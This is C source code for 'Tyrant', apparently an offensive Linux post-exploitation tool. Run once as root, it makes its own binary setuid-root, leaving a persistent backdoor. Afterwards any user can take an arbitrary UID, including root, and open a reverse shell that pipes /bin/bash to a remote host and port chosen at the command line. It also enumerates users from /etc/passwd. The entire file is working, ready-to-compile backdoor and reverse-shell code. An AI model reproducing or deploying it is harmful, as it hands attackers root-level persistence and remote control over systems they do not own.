// Maptnh@S-H4CK13
// Tyrant Version 1.0.1
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <netinet/in.h>
const char* ascii_art[] = {
    "  ______                       __       _____ __________ ",
    " /_  __/_  ___________ _____  / /_     / ___// ____/ __ \\",
    "  / / / / / / ___/ __ `/ __ \\/ __/_____/\\__ \\/ __/ / /_/ /",
    " / / / /_/ / /  / /_/ / / / / /_/_____/__/ / /___/ _, _/ ",
    "/_/  \\__, /_/   \\__,_/_/ /_/\\__/     /____/_____/_/ |_|  ",
    "    /____/                                               ",
    "   Maptnh@S-H4CK13    https://github.com/MartinxMax/Tyrant"
};

const char* ascii_art_rev[] = {
    "  ______                       __        ________    ____  ",
    " /_  __/_  ___________ _____  / /_      / ____/ /   /  _/  ",
    "  / / / / / / ___/ __ `/ __ \\/ __/_____/ /   / /    / /    ",
    " / / / /_/ / /  / /_/ / / / / /_/_____/ /___/ /____/ /     ",
    "/_/  \\__, /_/   \\__,_/_/ /_/\\__/      \\____/_____/___/      ",
    "    /____/                                                "
};

void print_ascii_art() {
    int num_lines = sizeof(ascii_art) / sizeof(ascii_art[0]);
    for (int i = 0; i < num_lines; i++) {
        printf("%s\n", ascii_art[i]);
    }
}

void list_all_users() {
    FILE *file;
    char line[256];
    char *username, *uid, *home_dir;

    file = fopen("/etc/passwd", "r");
    if (file == NULL) {
        printf("[!] Failed to open /etc/passwd file\n");
        exit(EXIT_FAILURE);
    }

    printf("\n%-20s %-8s %-30s\n", "Username", "UID", "Home Directory");
    printf("%-20s %-8s %-30s\n", "--------", "----", "------------");

    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\n")] = '\0';

        username = strtok(line, ":");
        for (int i = 0; i < 2; i++) {
            strtok(NULL, ":");
        }
        uid = strtok(NULL, ":");
        for (int i = 0; i < 2; i++) {
            strtok(NULL, ":");
        }
        home_dir = strtok(NULL, ":");

        if (home_dir == NULL) {
            home_dir = "(null)";
        }

        printf("%-20s %-8s %-30s\n", username, uid, home_dir);
    }

    fclose(file);
}

void reverse_shell(const char* rhost, int rport) {
    int sockfd;
    struct sockaddr_in target;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        printf("[!] Failed to create socket\n");
        exit(EXIT_FAILURE);
    }

    target.sin_family = AF_INET;
    target.sin_port = htons(rport);
    if (inet_pton(AF_INET, rhost, &target.sin_addr) <= 0) {
        printf("[!] Invalid IP address\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, (struct sockaddr*)&target, sizeof(target)) < 0) {
        printf("[!] Reverse Shell establishment failed, unable to connect to the host\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    for (int i = 0; i < sizeof(ascii_art_rev) / sizeof(ascii_art[0]); i++) {
        write(0, ascii_art_rev[i], strlen(ascii_art_rev[i]));
        write(0, "\n", 1);
    }

    execl("/bin/bash", "bash", NULL);
    close(sockfd);
    exit(EXIT_FAILURE);
}

void show_help(const char* program_name) {
    printf("Usage: %s [options]\n", program_name);
    printf("Options:\n");
    printf("  -h, --help          Show this help information and exit\n");
    printf("  -uid <UID>          Specify user ID\n");
    printf("  -rhost <IP>         Specify the target IP address for the reverse shell\n");
    printf("  -rport <PORT>       Specify the target port for the reverse shell\n");
    printf("\n");
    printf("If no options are provided, the program will list the current user UID and the UID and home directory of all users in the system.\n");
}


bool check() {
    struct stat file_stat;
    if (stat("/proc/self/exe", &file_stat) == -1) {
        return false;  
    }
    if ((file_stat.st_mode & S_ISUID) && (file_stat.st_uid == 0)) {
        return true;  
    } else {
        return false;
    }
}


int main(int argc, char* argv[]) {
    print_ascii_art();
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[*] Current user is root.\n");

        char path[1024];
        ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
        if (len < 0) {
            printf("[!] Unable to get program path\n");
            exit(EXIT_FAILURE);
        }
        path[len] = '\0';

        if (access(path, F_OK) != 0) {
            printf("[!] File does not exist\n");
            exit(EXIT_FAILURE);
        }

 
        if (chown(path, 0, 0) < 0) {
            printf("[!] Failed to change file owner to root\n");
            exit(EXIT_FAILURE);
        }

        if (chmod(path, 04755) < 0) {
            printf("[!] Failed to set setuid permissions\n");
            exit(EXIT_FAILURE);
        }
        printf("[*] Successfully set the S-bit and changed owner to root for the current script!\n");
    } else {
        printf("[!] Current user is not root, UID: %d.\n", uid);
    }

    if (argc == 1) {
        printf("[*] Listing the UID and home directory of all users in the system:\n");
        list_all_users();
    } else {
        int uid = -1;
        char* rhost = NULL;
        int rport = -1;

        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
                show_help(argv[0]);
                exit(EXIT_SUCCESS);
            } else if (strcmp(argv[i], "-uid") == 0 && i + 1 < argc) {
                uid = atoi(argv[++i]);
            } else if (strcmp(argv[i], "-rhost") == 0 && i + 1 < argc) {
                rhost = argv[++i];
            } else if (strcmp(argv[i], "-rport") == 0 && i + 1 < argc) {
                rport = atoi(argv[++i]);
            } else {
                fprintf(stderr, "[?] Unknown parameter: %s\n", argv[i]);
                show_help(argv[0]);
                exit(EXIT_FAILURE);
            }
        }

        if (uid < 0 || rhost == NULL || rport <= 0) {
            fprintf(stderr, "[!] Incomplete or invalid parameters.\n");
            show_help(argv[0]);
            exit(EXIT_FAILURE);
        }
  
    if (getuid() == 0) {  
        setuid(uid);   
        } else {
            if (!check()) {
                printf("[!] Non-root users cannot perform reverse shell operations.\n");
                exit(EXIT_FAILURE);
            } else {
                setuid(uid);
            }
        }
        reverse_shell(rhost, rport);
    }
    return 0;
}
